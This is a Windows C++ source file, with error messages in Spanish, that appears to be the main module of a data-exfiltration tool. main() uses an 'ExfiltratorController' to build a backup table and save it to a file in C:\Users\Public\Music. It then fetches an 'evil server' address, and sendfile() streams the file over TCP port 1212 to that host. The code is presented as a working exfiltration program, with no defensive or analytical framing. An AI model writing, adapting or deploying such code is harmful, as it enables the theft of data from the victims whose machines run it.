#include <iostream>
#include <winsock2.h>
#include "ExfiltratorController.h"
#include <Ws2tcpip.h> 

#pragma comment(lib, "Ws2_32.lib")

using namespace std;


int sendfile(string ip) {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup falló con error: " << result << '\n';
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "No se pudo crear el socket: " << WSAGetLastError() << '\n';
        WSACleanup();
        return 1;
    }

    SOCKADDR_IN remoteAddr;
    remoteAddr.sin_family = AF_INET;
    remoteAddr.sin_port = htons(1212);
    if (inet_pton(AF_INET, ip.c_str(), &remoteAddr.sin_addr) <= 0) {
        std::cerr << "Dirección IP inválida: " << WSAGetLastError() << '\n';
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    result = connect(sock, (SOCKADDR*)&remoteAddr, sizeof(remoteAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "No se pudo conectar: " << WSAGetLastError() << '\n';
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    FILE* file;
    errno_t err = fopen_s(&file, "C:\\Users\\Public\\Music\\db.txt", "rb");
    if (err != 0) {
        std::cerr << "No se pudo abrir el archivo: " << err << '\n';
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    if (!file) {
        std::cerr << "No se pudo abrir el archivo: " << errno << '\n';
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    char buffer[4096];
    while (!feof(file)) {
        size_t bytesRead = fread(buffer, 1, sizeof(buffer), file);
        size_t bytesSent = send(sock, buffer, bytesRead, 0);
        if (bytesSent == SOCKET_ERROR) {
            std::cerr << "Error al enviar datos: " << WSAGetLastError() << '\n';
            fclose(file);
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    }

    fclose(file);
    closesocket(sock);
    WSACleanup();

}

int main(){
    string evil_server;
    ExfiltratorController exf = ExfiltratorController();
    std::vector<std::vector<std::string>> table = exf.createBackup();
    exf.saveTableToFile(table, "C:\\Users\\Public\\Music\\db.txt");
    evil_server = exf.getEvilServer();
    sendfile(evil_server);
    
    return 0;
}


